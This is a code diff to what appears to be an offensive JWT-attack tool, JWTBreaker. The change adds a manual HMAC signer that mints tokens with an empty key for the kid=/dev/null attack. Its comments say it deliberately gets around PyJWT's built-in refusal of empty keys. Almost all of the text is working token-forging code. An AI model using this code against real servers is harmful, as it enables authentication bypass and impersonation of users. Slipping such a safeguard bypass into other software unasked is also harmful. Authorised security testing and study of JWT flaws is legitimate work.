@@ -145,6 +145,11 @@ class JWTBreaker:
     DEFAULT_WORDLIST = Path(__file__).parent / "jwt_secrets.txt"
     ROCKYOU = Path("/usr/share/wordlists/rockyou.txt")
 
+    # HMAC algorithms we can sign manually (used for the empty-key bypass in
+    # forge(); PyJWT refuses an empty HMAC key, which the kid=/dev/null
+    # technique requires).
+    _HS_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
+
     def __init__(self, *, wordlist: Optional[Path] = None,
                  john_path: Optional[str] = None,
                  hashcat_path: Optional[str] = None):
@@ -204,9 +209,43 @@ class JWTBreaker:
         if not isinstance(claims, dict):
             raise TypeError("claims must be a dict")
         headers = dict(extra_header) if extra_header else None
+
+        # PyJWT 2.10+ raises InvalidKeyError on an empty HMAC key as a
+        # defense-in-depth measure. The kid=/dev/null technique REQUIRES a
+        # token signed with an EMPTY secret (a vulnerable server reads
+        # /dev/null → empty key), so for that specific case we sign by hand —
+        # the same bypass philosophy documented in try_alg_confusion().
+        # Every non-empty case still goes through PyJWT unchanged.
+        if secret == "" and alg.upper() in self._HS_HASHES:
+            return self._sign_hs_empty(claims, alg=alg, extra_header=extra_header)
+
         token = pyjwt.encode(claims, secret, algorithm=alg, headers=headers)
         # PyJWT returns str on 2.x; older versions returned bytes
         return token if isinstance(token, str) else token.decode("ascii")
+
+    @staticmethod
+    def _b64url(data: bytes) -> str:
+        """URL-safe base64 without padding — the JWT segment encoding."""
+        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
+
+    def _sign_hs_empty(self, claims: dict, *, alg: str = "HS256",
+                       extra_header: Optional[dict] = None) -> str:
+        """Mint an HS* JWT signed with an EMPTY HMAC key.
+
+        PyJWT refuses an empty HMAC key; the kid=/dev/null attack depends on
+        exactly that token. We build it directly —
+        b64url(header).b64url(payload).b64url(HMAC(b"", signing_input)) —
+        mirroring PyJWT's own layout, with only the key differing.
+        """
+        hash_fn = self._HS_HASHES[alg.upper()]
+        header = {"typ": "JWT", "alg": alg}
+        if extra_header:
+            header.update(extra_header)
+        seg_h = self._b64url(json.dumps(header, separators=(",", ":")).encode())
+        seg_p = self._b64url(json.dumps(claims, separators=(",", ":")).encode())
+        signing_input = f"{seg_h}.{seg_p}".encode("ascii")
+        signature = hmac.new(b"", signing_input, hash_fn).digest()
+        return f"{seg_h}.{seg_p}.{self._b64url(signature)}"
 
     # ── alg=none attack ───────────────────────────────────────────────────
 
